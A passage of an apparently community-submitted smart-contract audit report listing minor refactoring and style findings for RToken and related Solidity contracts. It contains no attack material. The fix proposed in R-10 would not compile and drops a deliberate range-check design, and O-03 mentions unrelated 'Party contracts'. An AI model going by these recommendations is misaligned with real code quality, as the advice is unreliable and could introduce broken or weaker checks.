13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-09] Function should be deleted, if a modifier already exists doing its job</h2>\n<p>The function <code>requireNotPausedOrFrozen</code> is created only to hold the modifier notPausedOrFrozen.<br>\nAnd for this purpose in some functions requireNotPausedOrFrozen is called in order to check if its paused or frozen.<br>\nThis function isn’t necessary as the modifier notPausedOrFrozen can just be applied on the functions.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"105\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">838</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">RewardableLibP1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">523</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Consider removing <code>requireNotPausedOrFrozen();</code> and apply the modifier to the function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"107\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">520</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">521</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">RewardableLibP1</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assetRegistry</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">522</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"r-10-the-right-value-should-be-used-instead-of-downcasting-from-uint256-to-uint192\" style=\"position:relative;\"><a href=\"#r-10-the-right-value-should-be-used-instead-of-downcasting-from-uint256-to-uint192\" aria-label=\"r 10 the right value should be used instead of downcasting from uint256 to uint192 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-10] The right value should be used instead of downcasting from uint256 to uint192</h2>\n<p>In the function <code>requireValidBUExchangeRate</code> local variables are used to calculate the outcome of low and high.<br>\nAfter that a require statement is made to ensure the BU rate is in range. The problem is that for the local variables uint256 is used and later in the require statement the value are downcasted to uint192.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"108\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">802</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requireValidBUExchangeRate</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">803</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">804</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">805</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">806</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// Note: These are D18s, even though they are uint256s. This is because</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">807</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// we cannot assume we stay inside our valid range here, as that is what</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">808</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// we are checking in the first place</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">809</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">low</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// D18{BU/rTok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">810</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">high</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// D18{BU/rTok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">811</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">812</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">813</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span><span class=\"mtk12\">low</span><span class=\"mtk1\">) &gt;= </span><span class=\"mtk7\">1e9</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">uint192</span><span class=\"mtk1\">(</span><span class=\"mtk12\">high</span><span class=\"mtk1\">) &lt;= </span><span class=\"mtk7\">1e27</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BU rate out of range&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">814</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>Consider changing the local variables to use uint192 in the first place, instead of downcasting it:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">809</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">low</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// D18{BU/rTok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">810</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">high</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">FIX_ONE_256</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">basketsNeeded</span><span class=\"mtk1\"> + (</span><span class=\"mtk12\">supply</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)) / </span><span class=\"mtk12\">supply</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// D18{BU/rTok}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">811</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">812</span><span class=\"mtk1\">:        </span><span class=\"mtk3\">// 1e9 = FIX_ONE / 1e9; 1e27 = FIX_ONE * 1e9</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">813</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">low</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk7\">1e9</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">high</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk7\">1e27</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;BU rate out of range&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"o-01-code-contains-empty-blocks\" style=\"position:relative;\"><a href=\"#o-01-code-contains-empty-blocks\" aria-label=\"o 01 code contains empty blocks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-01] Code contains empty blocks</h2>\n<p>There are some empty blocks, which are unused. The code should do something or at least have a description why it is structured that way.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Main</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newImplementation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">OWNER</span><span class=\"mtk1\">) {}</span></span></span></code></pre>\n<p>Other instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"111\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">838</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requireNotPausedOrFrozen</span><span class=\"mtk1\">() </span><span class=\"mtk11\">private</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Component</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">57</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_authorizeUpgrade</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newImplementation</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">governance</span><span class=\"mtk1\"> {}</span></span></span></code></pre>\n<h2 id=\"o-02-use-a-more-recent-pragma-version\" style=\"position:relative;\"><a href=\"#o-02-use-a-more-recent-pragma-version\" aria-label=\"o 02 use a more recent pragma version permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-02] Use a more recent pragma version</h2>\n<p>Old version of solidity is used, consider using the new one <code>0.8.17</code>.</p>\n<p>You can see what new versions offer regarding bug fixed <a href=\"https://github.com/ethereum/solidity/blob/develop/Changelog.md\">here</a></p>\n<p>Instances - All of the contracts.</p>\n<h2 id=\"o-03-function-naming-suggestions\" style=\"position:relative;\"><a href=\"#o-03-function-naming-suggestions\" aria-label=\"o 03 function naming suggestions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-03] Function Naming suggestions</h2>\n<p>Proper use of <code>_</code> as a function name prefix and a common pattern is to prefix internal and private function names with <code>_</code>.</p>\n<p>This pattern is correctly applied in the Party contracts, however there are some inconsistencies in the libraries.</p>\n<p>Instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"112\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BackingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">154</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">handoutExcessAssets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">68: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">empty</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">75: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setFrom</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">87: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">add</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">356: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantityMulPrice</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">650: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">requireValidCollArray</span></span></span></code></pre>\n<h2 id=\"o-04-events-is-missing-indexed-fields\" style=\"position:relative;\"><a href=\"#o-04-events-is-missing-indexed-fields\" aria-label=\"o 04 events is missing indexed fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-04] Events is missing indexed fields</h2>\n<p>Index event fields make the field more quickly accessible to off-chain.</p>\n<p>Each event should use three indexed fields if there are three or more fields.</p>\n<p>Instances in:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"113\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IDistributor</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">: </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">DistributionSet</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dest</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rTokenDist</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrDist</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IRToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">83</span><span class=\"mtk1\">: </span><span class=\"mtk12\">event</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BasketsNeededChanged</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">oldBasketsNeeded</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newBasketsNeeded</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"o-05-proper-use-of-get-as-a-function-name-prefix\" style=\"position:relative;\"><a href=\"#o-05-proper-use-of-get-as-a-function-name-prefix\" aria-label=\"o 05 proper use of get as a function name prefix permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-05] Proper use of get as a function name prefix</h2>\n<p>Clear function names can increase readability. Follow a standard convertion function names such as using get for getter (view/pure) functions.</p>\n<p>Instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"114\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">296: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">316: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">325: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lotPrice</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">394: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">basketTokens</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">407: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quote</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">Distributor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">141: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">totals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">RToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">596: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">scalingRedemptionRate</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">609: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redemptionRateFloor</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">621: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">issueItem</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">628: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">redemptionLimit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk11\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk11\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">425: </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">exchangeRate</span></span></span></code></pre>\n<h2 id=\"o-06-commented-out-code\" style=\"position:relative;\"><a href=\"#o-06-commented-out-code\" aria-label=\"o 06 commented out code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[O-06] Commented out code</h2>\n<p>Commented code in the 